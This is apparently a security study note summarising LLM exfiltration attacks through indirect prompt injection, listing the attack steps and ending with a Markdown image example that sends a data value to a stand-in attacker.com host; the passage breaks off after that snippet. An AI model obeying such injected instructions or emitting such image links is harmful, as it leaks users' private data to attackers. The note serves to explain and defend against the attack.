# Exfiltration Attacks — Detailed Summary & Checklist

## Overview
**Exfiltration attacks** are a critical class of LLM security vulnerabilities where attackers extract sensitive data accessible to an LLM (e.g., chat history, secrets, private messages, emails, documents) and transmit it to an attacker-controlled endpoint. These attacks are especially dangerous because they often require **no direct access** to the victim’s account and can be executed via **indirect prompt injection**.

Exfiltration is commonly classified under:
- **OWASP LLM Top 10 – Improper Output Handling**
- **Indirect Prompt Injection**
- **Insecure Model Output**

---

## Core Concept
An attacker:
1. Injects a malicious instruction into content the victim processes with an LLM  
2. Forces the LLM to embed sensitive data into outbound requests  
3. Leverages automatic behaviors (Markdown rendering, link previews, plugin fetches)  
4. Collects leaked data via HTTP request logs  

---

## Exfiltration via Markdown (Primary Vector)

### Why Markdown Is Dangerous
Many LLM-powered web apps render Markdown by default:
- **Bold / Italics**
- **Code blocks**
- **Lists**
- **Images**

Markdown images are especially dangerous because they automatically generate HTTP requests.

### Markdown Image Syntax
```md
![alt-text](http://attacker.com/resource?data=VALUE)
